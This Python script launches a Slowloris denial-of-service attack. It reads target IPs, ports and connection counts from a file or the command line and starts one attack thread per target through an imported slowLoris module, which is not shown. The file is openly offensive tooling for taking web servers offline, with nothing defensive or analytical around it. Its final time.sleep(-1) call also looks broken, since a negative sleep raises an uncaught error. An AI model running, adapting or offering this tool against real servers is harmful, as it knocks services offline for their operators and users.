import os.path
import slowLoris
import sys
import threading
import time

__author__ = "Jacob Misirian"

DEFAULT_PORT = 80
DEFAULT_CONNECTION_COUNT = 200

def parsetarget (line):
    parts = line.split ()
    partlen = len (parts)
    ip = parts [0]
    port = DEFAULT_PORT
    count = DEFAULT_CONNECTION_COUNT
    
    if partlen == 2:
        port = int (parts [1])
    elif partlen == 3:
        port = int (parts [1])
        count = int (parts [2])
    
    return (ip, port, count)

# Main entry point
if __name__ == '__main__':
    arglen = len (sys.argv)
    
    if arglen == 1:
        print ("Error! Expected at least one argument after file path!")
        exit ()

    # Holds a list of tuples in format (ip, port, count).
    targets = []
    
    # If the user gave us a file, hit all of the targets within.
    if os.path.isfile (sys.argv [1]):
        with open (sys.argv [1]) as f:
            lines = f.readlines()
        lines = [line.strip () for line in lines]
        for line in lines:
            targets.insert (0, parsetarget (line))
    else:
        targets.insert (0, parsetarget (' '.join (sys.argv [1:])))

    # Begin attacking our selected targets.
    try:
        loris = slowLoris.SlowLoris ()
        # Spawn a new daemon thread for each attacker, as it takes time to establish all the connections.
        for target in targets:
            attackThread = threading.Thread (target=loris.attack, args=[target [0], target [1], target [2]])
            attackThread.setDaemon (True)
            attackThread.start ()
            time.sleep (0.5)
        
        time.sleep (-1)
    except (KeyboardInterrupt, SystemExit):
        loris.stop ()
        exit ()